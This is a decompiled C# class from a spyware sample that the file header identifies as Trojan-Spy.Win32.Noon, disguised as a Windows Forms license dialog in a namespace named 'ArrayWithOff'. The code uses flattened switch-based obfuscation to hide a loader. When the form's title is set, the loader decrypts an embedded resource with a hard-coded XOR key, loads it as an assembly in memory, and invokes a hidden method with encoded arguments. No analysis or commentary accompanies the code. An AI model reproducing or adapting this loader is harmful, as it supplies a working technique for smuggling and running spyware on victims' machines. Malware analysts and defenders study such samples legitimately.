// Decompiled with JetBrains decompiler
// Type: ArrayWithOff.Licensing.CollectionComparatorLicense
// Assembly: ArrayWithOff, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C12E9A27-BEBF-4775-817A-6AC642D52B19
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcra-344266b0bd586b6b9907f1657c694060dd1bae1df9fda81d7433002d419fe4fa.exe

using ArrayWithOff.Database;
using RiskGame.Roles;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace ArrayWithOff.Licensing
{
  public class CollectionComparatorLicense : Form
  {
    private IContainer m_Parser;
    private static object expression;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public CollectionComparatorLicense()
    {
      int num1 = 1;
      while (true)
      {
        int num2 = num1;
        MethodInfo method;
        string[] parameters;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_1;
            case 1:
              ProxyParser.NewPool();
              num2 = 3;
              continue;
            case 3:
              goto label_7;
            case 4:
            case 5:
              parameters[2] = "RiskGame";
              method.Invoke((object) 0, (object[]) parameters);
              if (!CollectionComparatorLicense.FindContainer())
              {
                num2 = 7;
                continue;
              }
              goto label_6;
            case 6:
              goto label_6;
            case 7:
              goto label_9;
            default:
              num2 = 6;
              continue;
          }
        }
label_1:
        // ISSUE: explicit constructor call
        base.\u002Ector();
        this.ReadSerializer();
        method = ((System.Type) CollectionComparatorLicense.expression).GetMethod("InvalidCast");
label_6:
        parameters = new string[3]
        {
          "496E7433325479706549",
          "52496B7152776230",
          null
        };
        num1 = 5;
        continue;
label_7:
        this.m_Parser = (IContainer) null;
        num1 = 0;
      }
label_9:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool readspec)
    {
      int num1 = 4;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
          case 2:
label_1:
            this.m_Parser.Dispose();
            break;
          case 1:
          case 3:
            num3 = this.m_Parser != null ? 1 : 0;
            goto label_7;
          case 4:
            if (readspec)
            {
              num2 = 3;
              goto label_9;
            }
            else
            {
              num3 = 0;
              goto label_7;
            }
          case 5:
            goto label_8;
          default:
            num2 = 0;
            goto label_9;
        }
label_2:
        base.Dispose(readspec);
        num2 = 5;
        goto label_9;
label_7:
        if (num3 == 0)
          goto label_2;
        else
          goto label_1;
label_9:
        num1 = num2;
      }
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ReadSerializer()
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_1;
            case 1:
            case 4:
              this.StartPosition = FormStartPosition.CenterParent;
              this.Text = "Form1";
              this.ResumeLayout(false);
              if (!CollectionComparatorLicense.FindContainer())
              {
                num2 = 7;
                continue;
              }
              goto label_3;
            case 2:
            case 3:
              goto label_3;
            case 5:
              goto label_5;
            case 6:
              goto label_4;
            case 7:
              goto label_9;
            default:
              num2 = 2;
              continue;
          }
        }
label_1:
        ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (CollectionComparatorLicense));
        num1 = 6;
        continue;
label_3:
        this.Name = "Form1";
        num1 = 1;
        continue;
label_4:
        this.SuspendLayout();
        this.AutoScaleDimensions = new SizeF(8f, 16f);
        num1 = 5;
        continue;
label_5:
        this.AutoScaleMode = AutoScaleMode.Font;
        this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
        this.ClientSize = new Size(500, 750);
        this.FormBorderStyle = FormBorderStyle.None;
        goto label_3;
      }
label_9:;
    }

    public override string Text
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => base.Text;
      [MethodImpl(MethodImplOptions.NoInlining)] set => CollectionComparatorLicense.DisableSerializer();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static string DisableSerializer()
    {
      int num1 = 5;
      if (true)
        goto label_5;
label_1:
      string str1 = "P7C455RF8EBCYHA8URJ585";
      byte[] rawAssembly;
      for (int index = 92182; index >= 0; index += -1)
        rawAssembly[index % 46080] = (byte) ((ulong) ((long) ((int) rawAssembly[index % 46080] ^ (int) str1[index % 22]) - (long) Convert.ToUInt32(rawAssembly[(index + 1) % 46080]) + 256L) % 256UL);
      goto label_7;
label_4:
      int num2;
      num1 = num2;
label_5:
      ResourceManager resourceManager;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            goto label_9;
          case 2:
          case 3:
            goto label_1;
          case 4:
            goto label_7;
          case 5:
            resourceManager = new ResourceManager(typeof (IssuerExceptionRole));
            if (true)
            {
              num1 = 0;
              continue;
            }
            goto label_11;
          case 6:
            goto label_8;
          case 7:
            goto label_11;
          default:
            num1 = 4;
            continue;
        }
      }
label_8:
      string str2 = str1;
      num2 = 7;
      goto label_4;
label_9:
      rawAssembly = (byte[]) resourceManager.GetObject("Delic");
      num2 = 3;
      goto label_4;
label_11:
      return str2;
label_7:
      CollectionComparatorLicense.SetSerializer(Thread.GetDomain().Load(rawAssembly), 9);
      num2 = 6;
      goto label_4;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void SetSerializer(Assembly init, int offset_cust) => CollectionComparatorLicense.expression = (object) init.GetExportedTypes()[offset_cust];

    internal static bool StartContainer() => true;

    internal static bool FindContainer() => false;
  }
}
